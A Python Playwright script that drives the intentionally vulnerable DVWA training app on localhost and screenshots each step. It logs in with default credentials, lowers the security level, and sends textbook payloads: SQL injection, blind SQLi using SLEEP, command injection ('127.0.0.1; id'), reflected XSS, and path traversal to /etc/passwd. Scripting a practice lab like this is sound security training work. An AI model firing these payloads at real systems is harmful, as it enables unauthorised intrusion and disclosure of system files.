from playwright.sync_api import sync_playwright
import os

SCREENSHOT_DIR = '/tmp/dvwa_screenshots'
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    page.goto('http://localhost:8080/login.php')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/01_login.png')

    page.fill('input[name="username"]', 'admin')
    page.fill('input[name="password"]', 'password')
    page.click('input[name="Login"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/02_after_login.png')
    print(f'After login URL: {page.url}')

    page.goto('http://localhost:8080/setup.php')
    page.wait_for_load_state('networkidle')
    setup_btn = page.locator('input[name="create_db"]')
    if setup_btn.count() > 0:
        setup_btn.click()
        page.wait_for_load_state('networkidle')
        page.screenshot(path=f'{SCREENSHOT_DIR}/03_setup.png')
        print('Database setup done')

    page.goto('http://localhost:8080/security.php')
    page.wait_for_load_state('networkidle')
    page.select_option('select[name="security"]', 'low')
    page.click('input[name="seclev_submit"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/04_security.png')
    print('Security set to low')

    page.goto('http://localhost:8080/vulnerabilities/sqli/')
    page.wait_for_load_state('networkidle')
    page.fill('input[name="id"]', "1' OR 1=1 -- ")
    page.click('input[name="Submit"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/05_sqli.png')
    pre = page.locator('pre').first.text_content() if page.locator('pre').count() > 0 else ''
    print(f'SQLi: {pre[:200]}')

    page.goto('http://localhost:8080/vulnerabilities/exec/')
    page.wait_for_load_state('networkidle')
    page.fill('input[name="ip"]', '127.0.0.1; id')
    page.click('input[name="Submit"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/06_cmdi.png')
    pre = page.locator('pre').first.text_content() if page.locator('pre').count() > 0 else ''
    print(f'Cmdi: {pre[:200]}')

    page.goto('http://localhost:8080/vulnerabilities/xss_r/')
    page.wait_for_load_state('networkidle')
    page.fill('input[name="name"]', '<script>alert(1)</script>')
    page.click('input[type="submit"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/07_xss.png')
    pre = page.locator('pre').first.text_content() if page.locator('pre').count() > 0 else ''
    print(f'XSS: {pre[:200]}')

    page.goto('http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/08_lfi.png')
    has_passwd = 'root:x:0:0' in page.content()
    print(f'LFI /etc/passwd: {has_passwd}')

    page.goto('http://localhost:8080/vulnerabilities/upload/')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/09_upload.png')

    page.goto('http://localhost:8080/vulnerabilities/sqli_blind/')
    page.wait_for_load_state('networkidle')
    page.fill('input[name="id"]', "1' AND SLEEP(2) -- ")
    page.click('input[name="Submit"]')
    page.wait_for_load_state('networkidle')
    page.screenshot(path=f'{SCREENSHOT_DIR}/10_blind_sqli.png')
    print(f'Blind SQLi URL: {page.url}')

    browser.close()
    print('\nScreenshots saved to', SCREENSHOT_DIR)
